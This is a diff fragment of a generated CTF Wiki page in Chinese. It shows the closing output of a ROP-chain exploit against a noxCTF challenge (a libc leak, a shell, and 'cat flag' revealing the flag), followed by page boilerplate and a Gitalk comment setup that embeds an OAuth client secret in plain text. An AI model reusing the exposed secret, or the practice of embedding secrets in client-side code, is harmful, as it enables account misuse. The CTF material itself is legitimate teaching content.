+<span class="sd">    [+] libc -&gt; 0x7fbfa7624000</span>
+<span class="sd">    [*] Switching to interactive mode</span>
+<span class="sd">    You could have saved them all</span>
+<span class="sd">    $ cat flag</span>
+<span class="sd">    noxCTF{Mas7er_0f_ROPcha1ns}</span>
+<span class="sd">    $</span>
+<span class="sd">    [*] Closed connection to chal.noxale.com port 6667</span>
+<span class="sd">    &#39;&#39;&#39;</span>
+</pre></div>
+                
+                  
+                
+              
+              
+                <!-- Set from config but allow override -->
+   
+
+<hr>
+<blockquote class="page-copyright">
+    <p>本页面的全部内容在 <strong>CC BY-NC-SA 4.0</strong> 协议之条款下提供，附加条款亦可能应用。</p>
+</blockquote>
+<!-- Comments Integration -->
+ 
+<h2 id="__comments">评论</h2>
+<form id="gitalk-form" onsubmit="return false;">
+    <div id="gitalk-container"></div>
+</form>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: 'd78d2e8d782d95560289',
+        clientSecret: '954f1e7f8ae9b2566272a2105fe8df60b50e8e9b',
+        repo: 'comment',
+        owner: 'ctf-wiki',
+        admin: ['40huo', 'iromise'],
+        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script> 
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../GroceryList/writeup/" title="Grocery List" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  后退
+                </span>
+                Grocery List
+              </span>
+            </div>
+          </a>
+        
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; 2016 - 2018 DF Team
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+        
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../../assets/javascripts/application.a26c1c19.js"></script>
+      
+        
+        
+          
+          <script src="../../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
+          
+            
+              
+                <script src="../../../../assets/javascripts/lunr/tinyseg.js"></script>
+              
+              
+                <script src="../../../../assets/javascripts/lunr/lunr.jp.js"></script>
+              
+            
+          
+          
+        
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      
+        <script src="../../../../_static/js/extra.js"></script>
+      
+        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+        <script src="../../../../search/main.js"></script>
+      
+    
+    
+      
+    
+  </body>
+</html>
